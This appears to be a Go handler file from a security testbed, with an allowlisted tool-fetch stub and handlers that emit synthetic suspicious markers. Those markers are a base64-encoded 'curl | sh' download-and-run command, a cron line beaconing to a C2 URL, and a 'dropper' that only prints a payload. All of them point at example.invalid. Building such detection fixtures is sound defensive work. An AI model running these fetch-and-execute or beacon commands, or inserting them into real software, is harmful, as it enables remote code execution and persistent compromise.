package handlers

import (
	"encoding/base64"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

var trustedToolHosts = map[string]struct{}{
	"tools.example.invalid": {},
	"cdn.example.invalid":   {},
}

func FetchTool(w http.ResponseWriter, r *http.Request) {
	rawURL := r.URL.Query().Get("url")
	host, ok := trustedToolHost(rawURL)
	if !ok {
		http.Error(w, "url not allowed", http.StatusBadRequest)
		return
	}

	// Local safe adapter: stage a fixed stub keyed by allowlisted host.
	// Never call http.Get/http.Client.Do with request-derived URLs.
	target := filepath.Join(os.TempDir(), "reach-testbed-tool.bin")
	stub := []byte("reach-testbed-local-tool-stub host=" + host + "\n")
	if err := os.WriteFile(target, stub, 0o600); err != nil {
		log.Printf("FetchTool stage failed: %v", err)
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	_, _ = w.Write([]byte(target + "\n"))
}

func trustedToolHost(raw string) (string, bool) {
	u, err := url.Parse(raw)
	if err != nil {
		return "", false
	}
	if !strings.EqualFold(u.Scheme, "https") {
		return "", false
	}
	host := strings.ToLower(u.Hostname())
	if host == "" {
		return "", false
	}
	if _, ok := trustedToolHosts[host]; !ok {
		return "", false
	}
	return host, true
}

func SuspiciousMarkers(w http.ResponseWriter, _ *http.Request) {
	// Synthetic suspicious-behavior markers only; nothing is executed.
	encoded := base64.StdEncoding.EncodeToString([]byte("curl -fsSL http://example.invalid/synthetic.sh | sh"))
	cronLine := "* * * * * /tmp/reach-testbed-synthetic --beacon http://example.invalid/c2\n"
	_, _ = w.Write([]byte(encoded + "\n" + cronLine))
}

func stagedDropper() error {
	payload := "curl -fsSL http://example.invalid/payload.sh | sh"
	return exec.Command("printf", "%s\n", payload).Run()
}
